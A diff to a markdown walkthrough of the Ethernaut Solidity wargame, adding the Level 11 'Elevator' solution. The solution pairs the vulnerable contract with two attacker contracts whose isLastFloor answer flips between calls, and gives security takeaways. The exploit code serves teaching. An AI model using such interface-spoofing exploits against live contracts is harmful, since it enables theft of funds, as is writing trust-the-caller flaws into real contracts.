@@ -858,6 +858,107 @@ The famous DAO hack used reentrancy to extract a huge amount of ether from the v
 
 ### Level 11. Elevator
 
+**Goal**: `player` has to set top to true i.e. have to reach top of the building.
+
+Given contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+```
+
+Solution: ([Solidity inheritance](https://www.geeksforgeeks.org/solidity-inheritance/))
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+interface Building {
+    function isLastFloor(uint) external returns (bool);
+}
+
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+contract MyBuilding is Building {
+
+    bool public isLast = true;
+
+    function isLastFloor(uint _n) override external returns (bool) {
+        isLast = !isLast;
+        return isLast;
+    }
+
+    function callGoTo(address _elevatorAddr) public {
+        IElevator(_elevatorAddr).goTo(1);
+    }
+}
+```
+
+or
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+contract Building {
+    IElevator public el = IElevator(0xB5A83695305eCaF30Beed5DbC5B4fbA9C307608c);
+    bool public switchFlipped = false;
+
+    function hack() public {
+        el.goTo(1);
+    }
+
+    function isLastFloor(uint) public returns (bool) {
+        if (!switchFlipped) { // first call
+            switchFlipped = true;
+            return false;
+        } else { // second call
+          switchFlipped = false;
+          return true;
+        }
+    }
+}
+```
+
+Although we did implement `isLastFloor`, we won't use `_floor` param anywhere to determine if it's last floor. We are not obliged to anyway.
+
+We just alternate between returning `true` and `false`, so that 1st call will return `false` and 2nd call returns `true` and so on.
+
+Simply call `callGoTo` of `MyBuilding`, with contract.address of instance. That'll trigger `Elevator` to call `isLastFloor` of our contract - `MyBuilding`. And since second call sets `top` variable, it is set to `true`.
+
+**_Key Security Takeaways_**
+
+- You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions).
+- An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.
+
+Useful links:
+
+- Solidity [interfaces](https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces)
+
 ### Level 12. Privacy
 
 ### Level 13. Gatekeeper One
@@ -874,7 +975,7 @@ The famous DAO hack used reentrancy to extract a huge amount of ether from the v
 
 ### Level 19. MagicNumber
 
-### Level 20. Daniel
+### Level 20. Denial
 
 ### Level 21. Shop
 
@@ -891,6 +992,8 @@ The famous DAO hack used reentrancy to extract a huge amount of ether from the v
 ## MISC.
 
 - [payable() function In solidity](https://ethereum.stackexchange.com/questions/20874/payable-function-in-solidity)
+- [What are pure functions in Solidity?](https://www.educative.io/answers/what-are-pure-functions-in-solidity)
+- [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions)
 
 ## Credits
 
